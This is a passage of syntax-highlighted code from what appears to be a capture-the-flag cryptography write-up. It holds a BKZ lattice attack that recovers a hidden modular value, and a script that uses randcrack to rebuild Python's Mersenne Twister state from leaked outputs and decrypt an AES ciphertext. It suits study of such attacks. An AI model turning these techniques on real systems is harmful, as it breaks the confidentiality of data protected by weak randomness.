<span class=\"token operator\">=</span> b2<span class=\"token punctuation\">[</span>choice<span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"64\"></td><td><pre>    <span class=\"token keyword\">del</span> A<span class=\"token punctuation\">[</span>choice<span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"65\"></td><td><pre>    <span class=\"token keyword\">del</span> b2<span class=\"token punctuation\">[</span>choice<span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"66\"></td><td><pre>    <span class=\"token keyword\">assert</span> gcd<span class=\"token punctuation\">(</span>A0<span class=\"token punctuation\">,</span> q<span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"67\"></td><td><pre></pre></td></tr><tr><td data-num=\"68\"></td><td><pre>    Mt <span class=\"token operator\">=</span> matrix<span class=\"token punctuation\">(</span>ZZ<span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token operator\">*</span>n<span class=\"token operator\">+</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"69\"></td><td><pre>    <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span>n<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"70\"></td><td><pre>        Mt<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token operator\">*</span>i<span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token operator\">*</span>i<span class=\"token punctuation\">]</span>  <span class=\"token operator\">=</span> <span class=\"token operator\">-</span>q</pre></td></tr><tr><td data-num=\"71\"></td><td><pre>        Mt<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token operator\">*</span>i<span class=\"token operator\">+</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token operator\">*</span>i<span class=\"token punctuation\">]</span>  <span class=\"token operator\">=</span> <span class=\"token operator\">-</span>T1</pre></td></tr><tr><td data-num=\"72\"></td><td><pre>        Mt<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token operator\">*</span>i<span class=\"token operator\">+</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token operator\">*</span>i<span class=\"token operator\">+</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span>  <span class=\"token operator\">=</span> T3</pre></td></tr><tr><td data-num=\"73\"></td><td><pre>        Mt<span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">3</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token operator\">*</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> A0i<span class=\"token operator\">*</span>A<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">%</span> q</pre></td></tr><tr><td data-num=\"74\"></td><td><pre>        Mt<span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token operator\">*</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> T1<span class=\"token operator\">*</span>A0i<span class=\"token operator\">*</span>A<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">%</span> q</pre></td></tr><tr><td data-num=\"75\"></td><td><pre>        Mt<span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token operator\">*</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> A0i<span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>A<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token operator\">*</span>b02 <span class=\"token operator\">-</span> A0<span class=\"token operator\">*</span>b2<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">%</span> q</pre></td></tr><tr><td data-num=\"76\"></td><td><pre>    Mt<span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">3</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">-</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"77\"></td><td><pre>    Mt<span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">-</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> T3</pre></td></tr><tr><td data-num=\"78\"></td><td><pre>    R <span class=\"token operator\">=</span> <span class=\"token number\">2</span><span class=\"token operator\">^</span><span class=\"token punctuation\">(</span>s3<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"79\"></td><td><pre>    Mt<span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> R</pre></td></tr><tr><td data-num=\"80\"></td><td><pre>  <span class=\"token comment\">#matrix_overview(Mt)</span></pre></td></tr><tr><td data-num=\"81\"></td><td><pre></pre></td></tr><tr><td data-num=\"82\"></td><td><pre>    L <span class=\"token operator\">=</span> Mt<span class=\"token punctuation\">.</span>BKZ<span class=\"token punctuation\">(</span>block_size<span class=\"token operator\">=</span><span class=\"token number\">30</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"83\"></td><td><pre>    <span class=\"token comment\">#L = Mt.BKZ(block_size=30)</span></pre></td></tr><tr><td data-num=\"84\"></td><td><pre>    <span class=\"token keyword\">for</span> l <span class=\"token keyword\">in</span> L<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"85\"></td><td><pre>        <span class=\"token keyword\">if</span> l<span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> R <span class=\"token keyword\">and</span> l<span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token operator\">%</span>T3 <span class=\"token operator\">==</span> <span class=\"token number\">0</span> <span class=\"token keyword\">and</span> l<span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span><span class=\"token operator\">%</span>T3 <span class=\"token operator\">==</span> <span class=\"token number\">0</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"86\"></td><td><pre>            b0 <span class=\"token operator\">=</span> vector<span class=\"token punctuation\">(</span>l<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"87\"></td><td><pre></pre></td></tr><tr><td data-num=\"88\"></td><td><pre>            b01 <span class=\"token operator\">=</span> b0<span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">//</span> T3</pre></td></tr><tr><td data-num=\"89\"></td><td><pre>            b03 <span class=\"token operator\">=</span> b0<span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"90\"></td><td><pre></pre></td></tr><tr><td data-num=\"91\"></td><td><pre>            x0 <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>T1<span class=\"token operator\">*</span>b01 <span class=\"token operator\">+</span> b02 <span class=\"token operator\">+</span> b03<span class=\"token punctuation\">)</span> <span class=\"token operator\">*</span> A0i <span class=\"token operator\">%</span> q</pre></td></tr><tr><td data-num=\"92\"></td><td><pre></pre></td></tr><tr><td data-num=\"93\"></td><td><pre>            test1 <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span>bi <span class=\"token keyword\">for</span> bi <span class=\"token keyword\">in</span> b2org<span class=\"token punctuation\">]</span> </pre></td></tr><tr><td data-num=\"94\"></td><td><pre>            test2 <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>ai<span class=\"token operator\">*</span>x0 <span class=\"token operator\">%</span> q<span class=\"token punctuation\">)</span> <span class=\"token operator\">>></span> s3<span class=\"token punctuation\">)</span> <span class=\"token operator\">%</span> <span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token operator\">&lt;&lt;</span>s2<span class=\"token punctuation\">)</span> <span class=\"token keyword\">for</span> ai <span class=\"token keyword\">in</span> Aorg<span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"95\"></td><td><pre></pre></td></tr><tr><td data-num=\"96\"></td><td><pre><span class=\"token comment\">#             print(A0, x0)</span></pre></td></tr><tr><td data-num=\"97\"></td><td><pre><span class=\"token comment\">#             print([test1[x]-test2[x] for x in range(len(test1))])</span></pre></td></tr><tr><td data-num=\"98\"></td><td><pre><span class=\"token comment\">#             print()</span></pre></td></tr><tr><td data-num=\"99\"></td><td><pre></pre></td></tr><tr><td data-num=\"100\"></td><td><pre>            <span class=\"token keyword\">if</span> test1 <span class=\"token operator\">==</span> test2<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"101\"></td><td><pre>                <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'get: %d'</span> <span class=\"token operator\">%</span> x0<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"102\"></td><td><pre>                <span class=\"token keyword\">break</span></pre></td></tr><tr><td data-num=\"103\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'done'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"104\"></td><td><pre><span class=\"token keyword\">from</span> randcrack <span class=\"token keyword\">import</span> RandCrack</pre></td></tr><tr><td data-num=\"105\"></td><td><pre><span class=\"token keyword\">import</span> random</pre></td></tr><tr><td data-num=\"106\"></td><td><pre><span class=\"token keyword\">from</span> Crypto<span class=\"token punctuation\">.</span>Util<span class=\"token punctuation\">.</span>number <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"107\"></td><td><pre><span class=\"token keyword\">from</span> Crypto<span class=\"token punctuation\">.</span>Cipher <span class=\"token keyword\">import</span> AES</pre></td></tr><tr><td data-num=\"108\"></td><td><pre><span class=\"token keyword\">from</span> Crypto<span class=\"token punctuation\">.</span>Util<span class=\"token punctuation\">.</span>Padding <span class=\"token keyword\">import</span> pad</pre></td></tr><tr><td data-num=\"109\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">xor</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">,</span> b<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"110\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token builtin\">bytes</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span>a<span class=\"token punctuation\">[</span>i<span class=\"token operator\">%</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">^</span> b<span class=\"token punctuation\">[</span>i<span class=\"token operator\">%</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>b<span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span> <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">max</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>b<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"111\"></td><td><pre>ns <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token number\">38630062416586710341458654419912504176237737247477839749085033080367529539859992076587411537805430366799412095876782912512744262957062106155418341531142309858429218208463637096843365217114990765965110566415965985105403996944993619708417839598461935470469097206342256014086162845948208599334925650727933097059538199199685364793545286980392966271769914201657672004082101110775504946586957241075964270454872257405872181588544468173017149763827540561921126826597515171761064800381983526515300315517818122598179574900255685121991744205071544970</span><span class=\"token punctuation\">,</span> <span class=\"token number\">41522753602903133841910260331594875922287719226997542592715810409935551768308104573333760854332533376702631593490915962706512143045107096658851885513727202513616813054397657610854303071682604806070009002234312854968365250748142324994926715544722158698813288131533399544263105858513134170084625526223987620550110255872688155827773099232631041345207194483609514502522566888883736218471849075697433311580004701384847571029783514418685068903758509270527252444771313048094566344002411364378658592832008194309873599342916391769027015343562030852</span><span class=\"token punctuation\">,</span> <span class=\"token number\">41542983120532762175372001624404625565366126179958909731196555044290633581761361918706298428954501507557598076910710787422049443564800530253137695341299743714514361560156305534490483794181933110893966453220306980682146624294992100948497284459992930850081254114996830645068636306625330524465991656430799359422407117440063911943625477783216502523414967017151717597372146324488526509879620785458016456593044828784565522423332830549325397893426472247197776412026158371655860380929692662547882654137064941217130915364306358205055760044763651406</span><span class=\"token punctuation\">,</span> <span class=\"token number\">42853015443318352230776688785915441259875645365236808434164117288657978345098324019250085686482568413223085548506789311679316323466083886556772338612177680666217592255234589446979456714341877135596118517098603502394776049958587301113539552072352462301070489369653155854389890761241450743607560719433910573462283304103064437843063566946231984094581307498714742271881862348689297267558023093643893310002803310596286441071314219020032740336515363830250477649030557311461077069407775907176409762823453607196260454965048316567154365877848652918</span><span class=\"token punctuation\">,</span> <span class=\"token number\">31152961872836435078296602982779340735140569916125711058616435902653202922218293684857125091648631460215120167354825278469413413558325850576700866199515219603448136082693185200558425103833947831228064760642508443585470729998592994719564254894176473779555436230174300038353978808432410463449170865897259181312953584408177790825688497584119467820716449210429423337019604137134889051973100340798405991782200038835066294194815913887924272593864934325496116821854183293510325217934617021428710898873475027666892706022106386340733691632884942848</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"112\"></td><td><pre>A <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token number\">12789809461864875489953273982997537541385904671489556544122095227619591140533414669794423644619127980362623481580128258914287474542792728686579090501397390</span><span class=\"token punctuation\">,</span> <span class=\"token number\">10463950513938701625808784986819665844287315724639315128677227520960105897990256530542006653611594269012930935073966767351788182657861624733138283749460454</span><span class=\"token punctuation\">,</span> <span class=\"token number\">5253244650607533810967862436125419800679723144526973463211784033045021824966560017919956773745212139142517766154626849426827164032731516615725539069585525</span><span class=\"token punctuation\">,</span> <span class=\"token number\">5644589184984504085855423002268477365020278981591337230721358313393863912025011466727192648804002734561676112555123877764178690726130713927642577324443238</span><span class=\"token punctuation\">,</span> <span class=\"token number\">4231732567865883627242742552738439372803539125622706171540910152922080004603138662537022248675968288205781990968838888633816697065257733344028576518431020</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2483388920404524165854675814798022834892112957478917588986471421083048888193527751575039626887367465858751417977246719312923814782809309525841102293919541</span><span class=\"token punctuation\">,</span> <span class=\"token number\">3252353812256192711411255830105475125944842449239880454539397067913664088094160819193268643401968970009466652179043139341471403913410402646923633696154454</span><span class=\"token punctuation\">,</span> <span class=\"token number\">11575010486066232687430367040977113580882826853104996856464797182632266635060724100357205810604915010810884387573114266349621457564659060272935537811111850</span><span class=\"token punctuation\">,</span> <span class=\"token number\">116107444921917032985259963199427176510900273385517435613848456370557161312731449337837406563733552524777525870560544042690403987311424820755256727586807</span><span class=\"token punctuation\">,</span> <span class=\"token number\">5859050133610438843641532306693688255014116940390205022708310454673159702673207152462501010791971695002865650407033762568636006764435795015869726867643634</span><span class=\"token punctuation\">,</span> <span class=\"token number\">5954075553161305677556950650395792531753502207483036473422070018485916621872566706504374038792527687442272405589975343003802956899043321092006127828986114</span><span class=\"token punctuation\">,</span> <span class=\"token number\">4571747544457157571652286537158051402285727327066029382085461714597609990601683125994983291866807816649968826930652068427193317966970789937746419206862747</span><span class=\"token punctuation\">,</span> <span class=\"token number\">7166507561570980603812241332170524724051295937096000768984168029904561160020043035660087151672164814332446644696618077835020463308343415953131944864257266</span><span class=\"token punctuation\">,</span> <span class=\"token number\">4852042788460566411381271873349329096978244586097817622748766708426751073559942708861852208085367014057217116211249133109246735634468823924185525972777655</span><span class=\"token punctuation\">,</span> <span class=\"token number\">11962941918999276757181090570698839032103646409734781047194175833198626142790676141060052011581957980660140931408560130449153056874213033784715711461403345</span><span class=\"token punctuation\">,</span> <span class=\"token number\">10324508881746579337486319574059121005227580732153432145860775835052420139026016902518605634385512021513380467928195663920843022679549517463264144660593354</span><span class=\"token punctuation\">,</span> <span class=\"token number\">13276257094435850052122403884510025189232513948002582716865201271569293297601525601586036713056700716929820641888489806178376555435219630186396004003438962</span><span class=\"token punctuation\">,</span> <span class=\"token number\">6525051273399089095687950615197786094425890004112675057642687348101531212837185750558500720306108976630502328600886080197626115513445112562084719104488315</span><span class=\"token punctuation\">,</span> <span class=\"token number\">12922888505610354933000354792496863801007995464403098763485264334670452387681468617068312646367483171083114539083453125614861357751571161533921864394641576</span><span class=\"token punctuation\">,</span> <span class=\"token number\">9489726784141062031514945333087338495823600723655465328127755755022980083351477888038160719541864899912899592065620071698977397662002448273876711116012763</span><span class=\"token punctuation\">,</span> <span class=\"token number\">10630316198843195148937849513165933809121991192035364160395429088101265852052098101114542104327663563661384303617672183366879116750889320604308038959012109</span><span class=\"token punctuation\">,</span> <span class=\"token number\">12675564142993964272844760955973914547747654087592111324261755301551267959231076883765863344473167582531968290671984039948163579495803204811731286282708940</span><span class=\"token punctuation\">,</span> <span class=\"token number\">11847724105274460405216443356582445218232627275228120716891711887600046501095390733716854871561352002320819466803698088448952127166615410820121973485089326</span><span class=\"token punctuation\">,</span> <span class=\"token number\">5131676593756685549522564504727003861447389891839469018437277330988047271086971907217360711863971849879439418231726349935396008040776952541710218842744018</span><span class=\"token punctuation\">,</span> <span class=\"token number\">8049060452950901277510497437779182190254362319091882684392717180429468875432078713802857488901441344429723298843967365750616860588029426099852763482179470</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2365060249260571713545479629411006471094806409182638354076861269679377537605360223984548798658469783472746989448405310909017645138161178501458084966625559</span><span class=\"token punctuation\">,</span> <span class=\"token number\">7467521246204465304438401242342633361751371318557249418344587207503257890765643838557008735305668588521988487342275527781708126255070883848829062790678347</span><span class=\"token punctuation\">,</span> <span class=\"token number\">5841608816993144092409175658260479687582056537041472535819914412630519543198558564258699185557903902095773598614097026740427138629173672250387442834578787</span><span class=\"token punctuation\">,</span> <span class=\"token number\">3935779917509948624841228665498558015416911059417306651751360048412619176423173794541812556512582747588138532941031730797102738268660078594473168666677171</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1459083415233950534805962555425717865938763752937036513111696179351002303817986848490146888626704327653287774806488952733813718461674376764427084478395399</span><span class=\"token punctuation\">,</span> <span class=\"token number\">6426876689549337938550615491086475536072547585103523407263007393570982327518298678278232288342601754164640081474537962710401178482959474762541185760732929</span><span class=\"token punctuation\">,</span> <span class=\"token number\">5241364650650467046722868257809607948071188801137204831449976666385482519613365369974704486723941517654753205012497273820309153659423928739972270634209996</span><span class=\"token punctuation\">,</span> <span class=\"token number\">6387483223002092292686097811446217867743566298067033295601210265979889577756648605354064672061975949925472022416479935990178719227937307079186916383092053</span><span class=\"token punctuation\">,</span> <span class=\"token number\">170562164015232424518655058158727202269056868720093972639058422975773575660534168774299548952867348396798580779605954510297102765330549642318362861226163</span><span class=\"token punctuation\">,</span> <span class=\"token number\">10004133230245713370426176448219282796530473722412487408402635996842671302539458739305597027107498342509248085998067976408732789438099488867425813748783724</span><span class=\"token punctuation\">,</span> <span class=\"token number\">12325342879747412722323355648741345730921040452129462974449188258885453690169624888480720109964630270938743431623479816739889661554987977051169401841580388</span><span class=\"token punctuation\">,</span> <span class=\"token number\">641543989928732942291347866597230552820621633110802944556141221591498546555080480758772801043509130524233886009444044150447511986129019395067102094826363</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"113\"></td><td><pre>B <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token number\">108715652691370707411987210267535348806</span><span class=\"token punctuation\">,</span> <span class=\"token number\">131676833696101475747102644851662113271</span><span class=\"token punctuation\">,</span> <span class=\"token number\">122436706338521558335484593966234623745</span><span class=\"token punctuation\">,</span> <span class=\"token number\">255864866572301552398412638474857375629</span><span class=\"token punctuation\">,</span> <span class=\"token number\">81098761191414480003681301866161112100</span><span class=\"token punctuation\">,</span> <span class=\"token number\">322322463176364397336266169283851913620</span><span class=\"token punctuation\">,</span> <span class=\"token number\">198167679309202772183020662350938553923</span><span class=\"token punctuation\">,</span> <span class=\"token number\">326360662842236388778385468938922853242</span><span class=\"token punctuation\">,</span> <span class=\"token number\">241812832858991643670485138860832357660</span><span class=\"token punctuation\">,</span> <span class=\"token number\">69768236619183466076110136290750715548</span><span class=\"token punctuation\">,</span> <span class=\"token number\">32383134960394164339076842474280712870</span><span class=\"token punctuation\">,</span> <span class=\"token number\">147747232748027508904245311745435517130</span><span class=\"token punctuation\">,</span> <span class=\"token number\">25327826075608705748116808975774398964</span><span class=\"token punctuation\">,</span> <span class=\"token number\">65295332681674581261444632606267440749</span><span class=\"token punctuation\">,</span> <span class=\"token number\">236756211690281667988216748814564193312</span><span class=\"token punctuation\">,</span> <span class=\"token number\">106435149910135092172124474857722935730</span><span class=\"token punctuation\">,</span> <span class=\"token number\">270727089812520941022075406571244846193</span><span class=\"token punctuation\">,</span> <span class=\"token number\">206881193220261276126028739930244917728</span><span class=\"token punctuation\">,</span> <span class=\"token number\">131961838897694897398340205404861333362</span><span class=\"token punctuation\">,</span> <span class=\"token number\">219211823942216355573832791993673934321</span><span class=\"token punctuation\">,</span> <span class=\"token number\">150960424777134558142309786444952807101</span><span class=\"token punctuation\">,</span> <span class=\"token number\">51112048255939343109218372373173385772</span><span class=\"token punctuation\">,</span> <span class=\"token number\">182065623911902509203036774197184164110</span><span class=\"token punctuation\">,</span> <span class=\"token number\">168420344895532090057957641972492853410</span><span class=\"token punctuation\">,</span> <span class=\"token number\">301808673225362418769168353084541667053</span><span class=\"token punctuation\">,</span> <span class=\"token number\">132272458662433671393247350648662880688</span><span class=\"token punctuation\">,</span> <span class=\"token number\">495672626901999558635736361346563007</span><span class=\"token punctuation\">,</span> <span class=\"token number\">182444159345379042372018248514964944782</span><span class=\"token punctuation\">,</span> <span class=\"token number\">144584137563407779776361378564517880036</span><span class=\"token punctuation\">,</span> <span class=\"token number\">338518705859818740467225748906995999694</span><span class=\"token punctuation\">,</span> <span class=\"token number\">205885429741815676881969528495365151019</span><span class=\"token punctuation\">,</span> <span class=\"token number\">233897982464483450790005953366237992668</span><span class=\"token punctuation\">,</span> <span class=\"token number\">279307677123402840425362992920185630901</span><span class=\"token punctuation\">,</span> <span class=\"token number\">133493426228159673166382443820069696429</span><span class=\"token punctuation\">,</span> <span class=\"token number\">316624110847744871475435405969944304329</span><span class=\"token punctuation\">,</span> <span class=\"token number\">187931604382397525131117897387179435812</span><span class=\"token punctuation\">,</span> <span class=\"token number\">220019728924915067987393012581921164417</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"114\"></td><td><pre>enc <span class=\"token operator\">=</span> <span class=\"token string\">b'cTmkMb\\xfc\\x05|\\x1d\\xc7\\x13\\xbaSe\\xe0\\xbd\\xc0\\xd9\\xa3\\x8cwo\\x82yN[B&amp;\\x80\\xd7KPwQ`\\x9c\\xbf&lt;y\\x8e\\x8a\\x97e\\xa074\\xb2'</span></pre></td></tr><tr><td data-num=\"115\"></td><td><pre>p <span class=\"token operator\">=</span> <span class=\"token number\">293423658885957174953198318664231534672400520068303593221989900395768107225130267646792968959460384248015583618158947268381852534151783869878808621629530642974652628810907251607210136313789978156955302211733219987661815438401343683</span></pre></td></tr><tr><td data-num=\"116\"></td><td><pre>qs <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token number\">131652854998992340460932933993731125897813116722743686376983560714958080058923233248409034503774690239607116208895705898493850303901947236703110133505298609983284810093444203520115921832701341410849227152916518042701137140529134307531549378227512467328546119098289902430746983779822018304894103929281571525413</span><span class=\"token punctuation\">,</span> <span class=\"token number\">141511266543920640204851108882717061918499519024716923517514248367070338634660828288359191981534446617237237457570926154359850567907818887825241459539960851332083605978728440088953131619626527774313920056418134584436228962739496537421073639385845881572426849590024772919349691978877458062156730821572607672873</span><span class=\"token punctuation\">,</span> <span class=\"token number\">141580209579074771358119902964214884265714800703301766526870735917361796117958732525323339762543669223540333941343510091019273675614975849098906780013094909514077786941133773360404310184090030930516565609095022500583593332093716205650072484414131739114695927836823639651419583016937575905259672219169808799851</span><span class=\"token punctuation\">,</span> <span class=\"token number\">146044854072158237153990069761178958493571062078441968801079517583058614525603303027362065705929953628722431853515415176293684801669237065754945185720059098372197915158132235454091379597670225192854216050195682228295572771895067490933803307260784762155453144122860455926735319918967455789486223041409929890359</span><span class=\"token punctuation\">,</span> <span class=\"token number\">106170586213514666405822547055854778744599513311522853134366315698037979157905032001629297741088791016767993032460445141436353852063421744076307387301355120153231344571552451059925518261663442463900155612745088939372276105620396044370835885604615715702785297082602552840208808816600087632509205126284074679857</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"117\"></td><td><pre></pre></td></tr><tr><td data-num=\"118\"></td><td><pre>ms <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span>ns<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token operator\">-</span>qs<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token operator\">*</span>p <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">5</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"119\"></td><td><pre>x<span class=\"token operator\">=</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"120\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">5</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"121\"></td><td><pre>    temp <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"122\"></td><td><pre>    t <span class=\"token operator\">=</span> <span class=\"token builtin\">bin</span><span class=\"token punctuation\">(</span>ms<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>zfill<span class=\"token punctuation\">(</span><span class=\"token number\">256</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"123\"></td><td><pre>    <span class=\"token keyword\">for</span> j <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"124\"></td><td><pre>        temp<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>t<span class=\"token punctuation\">[</span>j<span class=\"token operator\">*</span><span class=\"token number\">32</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">(</span>j<span class=\"token operator\">+</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token number\">32</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"125\"></td><td><pre>    x<span class=\"token punctuation\">.</span>extend<span class=\"token punctuation\">(</span>temp<span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">:</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"126\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">37</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"127\"></td><td><pre>    temp <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"128\"></td><td><pre>    t <span class=\"token operator\">=</span> <span class=\"token builtin\">bin</span><span class=\"token punctuation\">(</span>A<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>zfill<span class=\"token punctuation\">(</span><span class=\"token number\">512</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"129\"></td><td><pre>    <span class=\"token 